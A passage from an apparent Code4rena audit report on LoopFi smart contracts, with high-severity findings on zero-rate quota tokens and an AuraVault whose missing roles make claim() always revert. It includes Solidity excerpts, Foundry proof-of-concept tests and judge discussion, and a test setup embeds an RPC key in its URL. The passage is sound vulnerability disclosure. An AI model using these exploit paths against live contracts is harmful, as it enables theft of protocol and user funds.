>   weth spent:  92000000000000000000
>   collateral received:  100000000000000000000
>   Total WETH earned:  3000000000000000000
>   collateral lost:  0
>   collateral remaining in position:  0
> 
> Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.38ms (1.44ms CPU time)
> 
> Ran 1 test suite in 11.36ms (4.38ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
> ```
> 
></details>
>
> After 30 days of interest accrued, attacker self-liquidates and receives the full amount of collateral without the penalty applied to the amount they receive, while profiting `3e18` WETH. This wouldn't be profitable if the penalty was applied to the value of the collateral to give to the liquidator.
> 
> Edit: Fixed a mistake that was noted in my first response.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/399#issuecomment-2417771521):**
 > Given the impact demonstrated above, this stays as High.

***

## [[H-03] Zero rates on new quoted tokens allow an attacker to take an interest free quota](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195)
*Submitted by [Bauchibred](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195)*

Take a look [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L161-L177):

```solidity
function addQuotaToken(address token) external override gaugeOnly {
  if (quotaTokensSet.contains(token)) {
    revert TokenAlreadyAddedException();
  }
  quotaTokensSet.add(token); //@audit rates here are `0` by default.
  totalQuotaParams[token].cumulativeIndexLU = 1;
  emit AddQuotaToken(token);
}
```

This function is used to add a new token, when the token is added [the rates are set to `0` by default](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L172) up until a general epoch update before the real rate gets set for the token [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/GaugeV3.sol#L77-L92).

```solidity
function _checkAndUpdateEpoch() internal {
  uint16 epochNow = IGearStakingV3(voter).getCurrentEpoch(); // U:[GA-14]

  if (epochNow > epochLastUpdate) {
    epochLastUpdate = epochNow; // U:[GA-14]

    if (!epochFrozen) {
      // The quota keeper should call back to retrieve quota rates for needed tokens
      _poolQuotaKeeper().updateRates(); //@audit
    }

    emit UpdateEpoch(epochNow); // U:[GA-14]
  }
}
```

Which calls [this](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L183-L222):

```solidity
function updateRates()
  external
  override
  gaugeOnly // U:[PQK-3]
{
  address[] memory tokens = quotaTokensSet.values();
  uint16[] memory rates = IGaugeV3(gauge).getRates(tokens); // U:[PQK-7]

  uint256 quotaRevenue; // U:[PQK-7]
  uint256 timestampLU = lastQuotaRateUpdate;
  uint256 len = tokens.length;

  for (uint256 i; i < len; ) {
    address token = tokens[i];
    uint16 rate = rates[i];

    TokenQuotaParams storage tokenQuotaParams = totalQuotaParams[token]; // U:[PQK-7]
    (uint16 prevRate, uint192 tqCumulativeIndexLU, ) = _getTokenQuotaParamsOrRevert(
      tokenQuotaParams
    );

    tokenQuotaParams.cumulativeIndexLU = QuotasLogic.cumulativeIndexSince(
      tqCumulativeIndexLU,
      prevRate,
      timestampLU
    ); // U:[PQK-7]

    tokenQuotaParams.rate = rate; // U:[PQK-7]

    quotaRevenue +=
      (IPoolV3(pool).creditManagerBorrowed(creditManagers[token]) * rate) /
      PERCENTAGE_FACTOR; // U:[PQK-7]

    emit UpdateTokenQuotaRate(token, rate); // U:[PQK-7]

    unchecked {
      ++i;
    }
  }

  IPoolV3(pool).setQuotaRevenue(quotaRevenue); // U:[PQK-7]
  lastQuotaRateUpdate = uint40(block.timestamp); // U:[PQK-7]
}
```

However, the problem is the fact that once [this new token is added](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L161-L177), and the rate is `0`, an attacker can request a huge quota even up to the configured limit without having to pay any interest to the protocol all through the period where `rate = 0`.

### Impact

A malicious user can request a very high quota and not pay any interest all through the period when the rate is defaulted to `0`.

### Recommended Mitigation Steps

Consider atomically updating the rates in the instance where a new quoted token is added.

### Assessed type

Context

**[0xtj24 (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#event-14195878692)**

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2371000791):**
> > an attacker can request a huge quota even up to the configured limit without having to pay any interest to the protocol.
> 
> Requesting from the Warden to elaborate on this, only in PJQA please. 

**[Bauchibred (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2394110341):**
 > @Koolex, what that snippet means is the malicious user can take a completely risk free position while exposing the system since the rate is defaulted to 0; i.e., they can just request a very high quota, which in this case would be the configured maximum for said asset thats's to be used to limit protocol's exposure. So in this case they do not pay any interest all throughout this period when these rates are `0`, which is why I submitted this as `High`.
> 
> To go into a bit more details on the whole context of the quota logic:  
> 
> In the current implementation, [quotas are used to limit the system's exposure to some assets](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L24-L32), so having zero rates is a direct loss on the protocol since no interest accrues over time with these rates [and as such `0` payments get made](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L28) for the requested quota; allowing the malicious users access to risk-free leveraging on the maximum amount of quota they can get.

**[Koolex (judge) increased severity to High and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2442496995):**
 > @Bauchibred - can you please provide a PoC on how a user can request a huge quota on zero rate? Not necessarily with code. but a breakdown of the call flow. The above proof lacking this.

**[Bauchibred (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2442805457):**
 > @Koolex, requesting a huge quota is by just [taking up a borrow position against the collateral](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L263) and whenever calculating the debt from the borrowed position or the revenue change, the methods shown in the report above and dropdown below from `PoolQuotaKeeper` are used.
> 
> <details>
> <summary>Call flow breakdown with code snippets</summary>
><br> 
>
> A user can request a [borrow credit against the collateral token](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L256-L266) here we'd have the `deltaDebt` to be non-zero which is what I mean by a huge quota. Now for each position there are two fees to be charged, one based on pool utilisation and another based on the quota fees from `PoolQuotaKeeperV3` and since the quota interest has been defaulted to zero before the next epoch as hinted in the report whenever paying back the protocol loses out on this interest, (i.e., the quota interest):
> 
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L256-L266
> 
> ```solidity
>     function borrow(address borrower, address position, uint256 amount) external {
>         int256 deltaDebt = toInt256(amount);
>         modifyCollateralAndDebt({
>             owner: position,
>             collateralizer: position,
>             creditor: borrower,
>             deltaCollateral: 0,
>             deltaDebt: deltaDebt
>         });
>     }
> 
> ```
> 
> That's to say when the user decides to repay, or their position is being interacted with the amount of debt is gotten by `_calcDebt`, but no quota interest is being calculated for them cause while calculating the debt for the position we have `0` interest rate being returned for `cumulativeQuotaInterest`. As such, it's not being considered for the overall accrued interest:
> 
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L467-L481
> 
> ```solidity
>     function _calcDebt(Position memory position) internal view returns (DebtData memory cdd) {
>         uint256 index = pool.baseInterestIndex();
>         cdd.debt = position.debt;
>         cdd.cumulativeIndexNow = index;
>         cdd.cumulativeIndexLastUpdate = position.cumulativeIndexLastUpdate;
>         cdd.cumulativeQuotaIndexLU = position.cumulativeQuotaIndexLU;
>         // Get cumulative quota interest
>         (cdd.cumulativeQuotaInterest, cdd.cumulativeQuotaIndexNow) = _getQuotedTokensData(cdd);
> 
>         cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest;
> 
>         cdd.accruedInterest = CreditLogic.calcAccruedInterest(cdd.debt, cdd.cumulativeIndexLastUpdate, index);
> 
>         cdd.accruedInterest += cdd.cumulativeQuotaInterest;
>     }
> ```
> 
> Note that the `cumulativeQuotaInterest` that's been used to define the overall accrued interest is gotten directly from:
>
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L484-L495
> 
> ```solidity
>     function _getQuotedTokensData(
>         DebtData memory cdd
>     ) internal view returns (uint128 outstandingQuotaInterest, uint192 cumulativeQuotaIndexNow) {
>         cumulativeQuotaIndexNow = IPoolQuotaKeeperV3(poolQuotaKeeper()).cumulativeIndex(address(token));
>         uint128 outstandingInterestDelta = QuotasLogic.calcAccruedQuotaInterest(
>             uint96(cdd.debt),
>             cumulativeQuotaIndexNow,
>             cdd.cumulativeQuotaIndexLU
>         );
> 
>         outstandingQuotaInterest = outstandingInterestDelta; // U:[CM-24]
>     }
> ```
> 
> Which queries the Quota keeper to get the current index, that's defined by the rate:
>
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L87-L93
> 
> ```solidity
>     function cumulativeIndex(address token) public view override returns (uint192) {
>         TokenQuotaParams storage tokenQuotaParams = totalQuotaParams[token];
>         (uint16 rate, uint192 tqCumulativeIndexLU, ) = _getTokenQuotaParamsOrRevert(tokenQuotaParams);
> 
>         return QuotasLogic.cumulativeIndexSince(tqCumulativeIndexLU, rate, lastQuotaRateUpdate);
>     }
> ```
>
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L259-L276
> 
> ```solidity
>     function _getTokenQuotaParamsOrRevert(
>         TokenQuotaParams storage tokenQuotaParams
>     ) internal view returns (uint16 rate, uint192 cumulativeIndexLU, uint16 quotaIncreaseFee) {
>         // rate = tokenQuotaParams.rate;
>         // cumulativeIndexLU = tokenQuotaParams.cumulativeIndexLU;
>         // quotaIncreaseFee = tokenQuotaParams.quotaIncreaseFee;
>         assembly {
>             let data := sload(tokenQuotaParams.slot)
>             rate := and(data, 0xFFFF)//@audit rate here
>             cumulativeIndexLU := and(shr(16, data), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
>             quotaIncreaseFee := shr(208, data)
>         }
> 
>         if (cumulativeIndexLU == 0) {
>             revert TokenIsNotQuotedException(); // U:[PQK-14]
>         }
>     }
> ```
> 
> Also in the same light revenue change for quota would always be `0` during modification of collateral/debt or even liquidation that's queried in the vault by the `_calcQuotaRevenueChange()` helper function:
> 
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L462-L466
> 
> ```solidity
>     function _calcQuotaRevenueChange(int256 deltaDebt) internal view returns (int256 quotaRevenueChange) {
>         uint16 rate = IPoolQuotaKeeperV3(poolQuotaKeeper()).getQuotaRate(address(token));
>         return QuotasLogic.calcQuotaRevenueChange(rate, deltaDebt);
>     }
> ```
> 
> https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/QuotasLogic.sol#L38-L41
> 
> ```solidity
>     /// @dev Computes the pool quota revenue change given the current rate and the quota change
>     function calcQuotaRevenueChange(uint16 rate, int256 change) internal pure returns (int256) {
>         return change * int256(uint256(rate)) / int16(PERCENTAGE_FACTOR);
>     }
> ```
> 
> </details>
> 
> > Edit: Took consideration of [@0xAlix2's comment below](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2443156678) and _explicitly_ attached the fact that the interest which Loopfi is losing out on is their "quota interest" and not the whole debt's interest as they assume. To note, why we are talking about debt in this discussion is cause I needed to showcase where the huge quota is requested since asked by the judge. Do check the diffs for the edit. In my opinion, this fact can also be seen clearly even from the title of the report that the user is getting an "interest free quota" and not an interest free debt.
> 
> NB: This same issue was [reported and fixed in the original Gearbox protocol, _see 7.3_](https://github.com/Gearbox-protocol/security/blob/main/audits/2024%20Mar%20-%20ChainSecurity_Gearbox_Core_V3.pdf) which this is a fork of. Albeit in that instance it was assessed as a Medium, I submitted as high cause per C4 standards and as hinted [here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2394110341) already, it doesn't need any hypothetical path to be actualised.

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2443156678):**
 > There's some confusion here, having 0 `cdd.cumulativeQuotaInterest` doesn't mean no interest. Let me explain, Loopfi has 2 separate interest rates, there's the [quota interest](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L474) and the [default credit interest](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L478), as seen the credit interest calculation has nothing to do with the Quota's logic, you can confirm this from Loopfi's [docs](https://docs.loopfi.xyz/the-protocol/lending-passive-eth-yield/utilization-rate#extra-rates).
> 
> I also had this fuzzing test that confirms this, that you can add in `src/test/unit/CDPVault.t.sol`:
>
> ```solidity
> function test_someFuzzzz() public {
>     CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1.0 ether, 0);
>     createGaugeAndSetGauge(address(vault));
>     address position = address(new PositionOwner(vault));
> 
>     uint256 depositAmount = 100 ether;
>     uint256 borrowAmount = 80 ether;
> 
>     token.mint(address(this), depositAmount);
>     token.approve(address(vault), depositAmount);
>     underlyingToken.mint(address(this), depositAmount);
>     underlyingToken.approve(address(vault), depositAmount);
> 
>     uint256 initialInterestRate = vault.pool().baseInterestRate();
> 
>     vault.deposit(position, depositAmount);
> 
>     vault.borrow(address(this), position, borrowAmount);
> 
>     vm.warp(block.timestamp + 30 days);
> 
>     console.log("repay");
> 
>     vault.repay(address(this), position, vault.virtualDebt(position));
> }
> ```
>
> ```diff
> function _calcDebt(Position memory position) internal view returns (DebtData memory cdd) {
>     uint256 index = pool.baseInterestIndex();
>     cdd.debt = position.debt;
>     cdd.cumulativeIndexNow = index;
>     cdd.cumulativeIndexLastUpdate = position.cumulativeIndexLastUpdate;
>     cdd.cumulativeQuotaIndexLU = position.cumulativeQuotaIndexLU;
>     // Get cumulative quota interest
>     (cdd.cumulativeQuotaInterest, cdd.cumulativeQuotaIndexNow) = _getQuotedTokensData(cdd);
> 
>     cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest;
> 
> +   console.log("cdd.cumulativeQuotaInterest", cdd.cumulativeQuotaInterest);
> 
>     cdd.accruedInterest = CreditLogic.calcAccruedInterest(cdd.debt, cdd.cumulativeIndexLastUpdate, index);
> 
> +   console.log("cdd.accruedInterest", cdd.accruedInterest);
> 
>     cdd.accruedInterest += cdd.cumulativeQuotaInterest;
> }
> ```
>
> ```
> Logs:
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 0
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 0
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 0
>   repay
>   cdd.cumulativeQuotaInterest 6575342465753424
>   cdd.accruedInterest 657658017727639000
>   cdd.cumulativeQuotaInterest 6575342465753424
>   cdd.accruedInterest 657658017727639000
> ```
>
> As seen the quota interest did accumulate.
> 
> Assuming the test is wrong (which I don't think so), and the quota interest is 0, we can manually manipulate the quota index (so that it matches the initially set index [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/quotas/PoolQuotaKeeperV3.sol#L174)) so that the resulting quota interest is 0:
>
> ```diff
> function _getQuotedTokensData(
>     DebtData memory cdd
> ) internal view returns (uint128 outstandingQuotaInterest, uint192 cumulativeQuotaIndexNow) {
> -   cumulativeQuotaIndexNow = IPoolQuotaKeeperV3(poolQuotaKeeper()).cumulativeIndex(address(token));
> +   cumulativeQuotaIndexNow = 1;
>     uint128 outstandingInterestDelta = QuotasLogic.calcAccruedQuotaInterest(
>         uint96(cdd.debt),
>         cumulativeQuotaIndexNow,
>         cdd.cumulativeQuotaIndexLU
>     );
> 
>     outstandingQuotaInterest = outstandingInterestDelta; // U:[CM-24]
> }
> ```
>
> ```
> Logs:
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 0
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 0
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 0
>   repay
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 657658017727639000
>   cdd.cumulativeQuotaInterest 0
>   cdd.accruedInterest 657658017727639000
> ```
>
> We can see that the Quota interest is indeed 0, but the user is casually paying the other "credit" interest.
> 
> As a result, there's always some interest being paid to the protocol.
> 
> Edit:
> My response mainly refuted the following, showing that interest will always be paid regardless of the Quota.
> >an attacker can request a huge quota even up to the configured limit without having to pay any interest to the protocol
> 
> Assuming that the Quotas interest will always be 0 (I still doubt it, as the above test shows this, unless I'm missing something), for this to be high, assets need to be "stolen/lost/compromised", how is this happening here? 

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/195#issuecomment-2445402584):**
 > @Bauchibred - I'm already aware that the issue was already reported elsewhere; in fact, if you search the in the codebase (in the lib) you would find the fixed version. Somehow, the devs overlooked it.
> 
> ```solidity
>      quotaChange = (rate == 0) ? int96(0) : QuotasLogic.calcActualQuotaChange(totalQuoted, limit, quotaChange); // U:[PQK-15]
> ```
> 
> To summarize the impact, quota interest won't be paid during the period where `rate = 0`, max time of this is one epoch. In normal cases, I would consider this as a Medium. However, I have re-assessed it above as High for the following reasons:
> - It can happen on each new token added.
> - Can be done at scale (i.e., many users) or one user with a huge amount, as a result loss of interest for LPs who voted for it.
> - It undermines the intended functionality from voting (CA vs LP) on quota rate, if there is any.

***

## [[H-04] `AuraVault` inherits `AccessControl` BUT does not call the `_setupRole()` function in it's constructor to set the initial roles. This leads to a complete DOS of the important claim function rendering the contract unable to claim rewards](https://github.com/code-423n4/2024-07-loopfi-findings/issues/174)
*Submitted by [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/174), also found by [karsar](https://github.com/code-423n4/2024-07-loopfi-findings/issues/430), [0xBugSlayer](https://github.com/code-423n4/2024-07-loopfi-findings/issues/421), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/387), [Kaysoft](https://github.com/code-423n4/2024-07-loopfi-findings/issues/359), [zhaojie](https://github.com/code-423n4/2024-07-loopfi-findings/issues/339), [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/310), [inh3l](https://github.com/code-423n4/2024-07-loopfi-findings/issues/306), [EPSec](https://github.com/code-423n4/2024-07-loopfi-findings/issues/293), and [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/89)*

The `AuraVault` contract inherits OpenZeppelin's `AccessControl` contract to implement role-based access control. The issue is that the `AuraVault` contract does not call the `_setupRole()` function in it's constructor to set the `DEFAULT_ADMIN_ROLE`, `VAULT_ADMIN_ROLE` or `VAULT_CONFIG_ROLE` roles.

Since this is not done in the constructor it is impossible to call `grantRole()` since it has the `onlyRole(getRoleAdmin(role))` modifier. It is important to note that no roles have been set; therefore, there is no address that can call this function to set roles. Therefore, it is impossible to set the `VAULT_ADMIN_ROLE` and `VAULT_CONFIG_ROLE` roles.

The minor impact is that the `setParameter()` function can never be called to change the `feed` or `auraPriceOracle` because it has the `onlyRole(VAULT_CONFIG_ROLE)` modifier. The critical impact is because `setVaultConfig()` function can never be called to initialize the `vaultConfig`.

The uninitialized `vaultConfig` struct will default all the variables to 0:

```solidity
struct VaultConfig {
        /// @notice The incentive sent to claimer (in bps)
        uint32 claimerIncentive;
        /// @notice The incentive sent to lockers (in bps)
        uint32 lockerIncentive;
        /// @notice The locker rewards distributor
        address lockerRewards;
    }

/// @notice CDPVault configuration
VaultConfig public vaultConfig;
```

The issue arises specifically from the `lockerRewards` variable being the 0 address. When a user calls `claim()` to claim accumulated rewards by depositing WETH instead, the following line will cause the call to always revert since it attempts to send 0 BAL to the 0 address.

```solidity
function claim(uint256[] memory amounts, uint256 maxAmountIn) external returns (uint256 amountIn) {
    // Claim rewards from Aura reward pool
    IPool(rewardPool).getReward();
    ...
    ...
    // Distribute BAL rewards
    IERC20(BAL).safeTransfer(_config.lockerRewards, (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS);
    ...
    ...
}
```

The balancer token will revert if the recipient is the 0 address due to the following check in it's `_transfer` function ([BAL token on etherscan](https://etherscan.io/token/0xba100000625a3754423978a60c9317c58a424e3d#code)).

```solidity
function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    _beforeTokenTransfer(sender, recipient, amount);

    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}
```

### Proof of Concept

Here is a fully coded POC with a mainnet fork:

1. Add the following `MockAuraPool.sol` to `/src/test/MockAuraPool.sol`:

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IPool {
    function asset() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function withdraw(uint256, bool) external;
    function withdraw(uint256, address, address) external;
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function getReward() external returns (bool);
    function extraRewardsLength() external view returns (uint256);
    function rewardToken() external view returns (address);
    function earned(address account) external view returns (uint256);
}

contract MockAuraPool is IPool, ERC20 {
    IERC20 public immutable _asset;
    IERC20 public immutable _rewardToken;
    mapping(address => uint256) public userRewards;

    constructor(address asset_, address rewardToken_) ERC20("Mock Aura Pool", "mAP") {
        _asset = IERC20(asset_);
        _rewardToken = IERC20(rewardToken_);
    }

    function asset() external view override returns (address) {
        return address(_asset);
    }

    function balanceOf(address account) public view override(IPool, ERC20) returns (uint256) {
        return super.balanceOf(account);
    }

    function deposit(uint256 amount, address receiver) external override returns (uint256) {
        _asset.transferFrom(msg.sender, address(this), amount);
        _mint(receiver, amount);
        return amount;
    }

    function withdraw(uint256 amount, bool) external override {
        _burn(msg.sender, amount);
        _asset.transfer(msg.sender, amount);
    }

    function withdraw(uint256 amount, address receiver, address owner) external override {
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, amount);
        }
        _burn(owner, amount);
        _asset.transfer(receiver, amount);
    }

    function redeem(uint256 shares, address receiver, address owner) external override returns (uint256) {
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }
        _burn(owner, shares);
        uint256 amount = shares; // 1:1 ratio for simplicity
        _asset.transfer(receiver, amount);
        return amount;
    }

    function getReward() external override returns (bool) {
        uint256 reward = userRewards[msg.sender];
        if (reward > 0) {
            userRewards[msg.sender] = 0;
            _rewardToken.transfer(msg.sender, reward);
        }
        return true;
    }

    function extraRewardsLength() external pure override returns (uint256) {
        return 0; // No extra rewards for simplicity
    }

    function rewardToken() external view override returns (address) {
        return address(_rewardToken);
    }

    function earned(address account) external view override returns (uint256) {
        return userRewards[account];
    }

    // Helper function to simulate rewards
    function setReward(address account, uint256 amount) external {
        userRewards[account] = amount;
    }
}
```

</details>

2. Add the following `MockOracle.sol` to `/src/test/MockOracle.sol`:

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "../interfaces/IOracle.sol";

contract MockOracle is IOracle {

    enum Variable { PAIR_PRICE, BPT_PRICE, INVARIANT }

    struct OracleAverageQuery {
        Variable variable;
        uint256 secs;
        uint256 ago;
    }

    mapping(address token => uint256 spot) private _spot;

    mapping(address => uint256) private prices;

    function updateSpot(address token, uint256 price) external {
        prices[token] = price;
    }

    function spot(address token) external view returns (uint256) {
        return prices[token];
    }

    function getStatus(address /*token*/) public pure returns (bool) {
        return true;
    }

    function getTimeWeightedAverage(OracleAverageQuery[] memory queries)
        external
        view
        returns (uint256[] memory results)
    {
        results = new uint256[](queries.length);
        for (uint256 i = 0; i < queries.length; i++) {
            // We're assuming that the Variable enum value corresponds to a token address
            // This might need adjustment based on how it's actually used in your system
            address token = address(uint160(uint256(queries[i].variable)));
            results[i] = prices[token];
        }
        return results;
    }
}
```

</details>

3. Add the following `AuraVault.t.sol` to `/src/test/integration/AuraVault.t.sol` and run it with the following command:

```
forge test --mt test__POC__ClaimFunctionAlwaysReverts -vvvvv
```

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {AuraVault} from "../../vendor/AuraVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockOracle} from "../MockOracle.sol";
import {MockAuraPool} from "../MockAuraPool.sol";

contract AuraVaultTest is Test {
    AuraVault public auraVault;
    MockAuraPool public mockAuraPool;
    IERC20 public weth;
    IERC20 public bal;
    IERC20 public aura;
    MockOracle public mockFeed;
    MockOracle public mockAuraPriceOracle;

    uint32 public constant MAX_CLAIMER_INCENTIVE = 1000; // 10%
    uint32 public constant MAX_LOCKER_INCENTIVE = 2000; // 20%

    uint256 mainnetFork;

    // Mainnet addresses
    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant BAL_ADDRESS = 0xba100000625a3754423978a60c9317c58a424e3D;
    address constant AURA_ADDRESS = 0xC0c293ce456fF0ED870ADd98a0828Dd4d2903DBF;

    address public USER = address(879);

    function setUp() public {
        mainnetFork = vm.createFork("<https://eth-mainnet.g.alchemy.com/v2/QF9A5wFdl6h_Im_XTqd7A8cbiyHc_VUu>");
        vm.selectFork(mainnetFork);

        // Use real token contracts
        weth = IERC20(WETH_ADDRESS);
        bal = IERC20(BAL_ADDRESS);
        aura = IERC20(AURA_ADDRESS);

        // Deploy mock contracts
        mockAuraPool = new MockAuraPool(WETH_ADDRESS, BAL_ADDRESS);
        mockFeed = new MockOracle();
        mockAuraPriceOracle = new MockOracle();

        // Deploy AuraVault
        auraVault = new AuraVault(
            address(mockAuraPool),
            WETH_ADDRESS,
            address(mockFeed),
            address(mockAuraPriceOracle),
            MAX_CLAIMER_INCENTIVE,
            MAX_LOCKER_INCENTIVE,
            "Aura Vault WETH",
            "avWETH"
        );

        // Set up mock oracle prices
        mockFeed.updateSpot(WETH_ADDRESS, 2000e18); // WETH at $2000
        mockFeed.updateSpot(BAL_ADDRESS, 10e18); // BAL at $10
        mockAuraPriceOracle.updateSpot(AURA_ADDRESS, 5e18); // AURA at $5

        // Give some WETH to the test contract and USER
        deal(WETH_ADDRESS, address(this), 100 ether);
        deal(WETH_ADDRESS, USER, 100 ether);

        // Approve vault to spend WETH
        weth.approve(address(auraVault), type(uint256).max);
        vm.prank(USER);
        weth.approve(address(auraVault), type(uint256).max);
    }

    function test__POC__ClaimFunctionAlwaysReverts() public {
        // Setup rewards
        uint256[] memory rewardAmounts = new uint256[](2);
        rewardAmounts[0] = 10e18; // 10 BAL
        rewardAmounts[1] = 5e18;  // 5 AURA
        deal(BAL_ADDRESS, address(mockAuraPool), rewardAmounts[0]);
        deal(AURA_ADDRESS, address(mockAuraPool), rewardAmounts[1]);
        mockAuraPool.setReward(address(auraVault), rewardAmounts[0]);

        // Calculate expected WETH amount for claim
        uint256 expectedWethAmount = (rewardAmounts[0] * 10e18 + rewardAmounts[1] * 5e18) / 2000e18;

        // User attempts to claim the rewards but it reverts
        vm.startPrank(USER);
        auraVault.claim(rewardAmounts, expectedWethAmount) ;
    }
}
```

</details>

**Console output:**

```
    │   ├─ [6168] 0xba100000625a3754423978a60c9317c58a424e3D::transfer(0x0000000000000000000000000000000000000000, 0)
    │   │   └─ ← [Revert] revert: ERC20: transfer to the zero address
    │   └─ ← [Revert] revert: ERC20: transfer to the zero address
    └─ ← [Revert] revert: ERC20: transfer to the zero address

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 13.81s (9.23s CPU time)

Ran 1 test suite in 15.09s (13.81s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in src/test/integration/AuraVault.t.sol:AuraVaultTest
[FAIL. Reason: revert: ERC20: transfer to the zero address] test__POC__ClaimFunctionAlwaysReverts() (gas: 637701)

Encountered a total of 1 failing tests, 0 tests succeeded.
```

### Impact

The minor impact is that the `setParameter()` function can never be called to change the `feed` or `auraPriceOracle` because it has the `onlyRole(VAULT_CONFIG_ROLE)` modifier. The critical impact is because `setVaultConfig()` function can never be called to initialize the `vaultConfig`.

The uninitialized `vaultConfig` struct will default all the variables to 0, causing the `claim` function to revert permanently. Since the `claim()` function always reverts it will be impossible to claim the rewards; therefore, there is no incentive to be deposit in the pool.

### Recommended Mitigation Steps

Modify the `AuraVault` constructor as follows:

```diff
constructor(
    address rewardPool_,
    address asset_,
    address feed_,
    address auraPriceOracle_,
    uint32 maxClaimerIncentive_,
    uint32 maxLockerIncentive_,
    string memory tokenName_,
    string memory tokenSymbol_,
+   address vaultAdminRole,
+   address vaultConfigRole

) ERC4626(IERC20(asset_)) ERC20(tokenName_, tokenSymbol_) {
    rewardPool = rewardPool_;
    feed = feed_;
    auraPriceOracle = auraPriceOracle_;
    maxClaimerIncentive = maxClaimerIncentive_;
    maxLockerIncentive = maxLockerIncentive_;

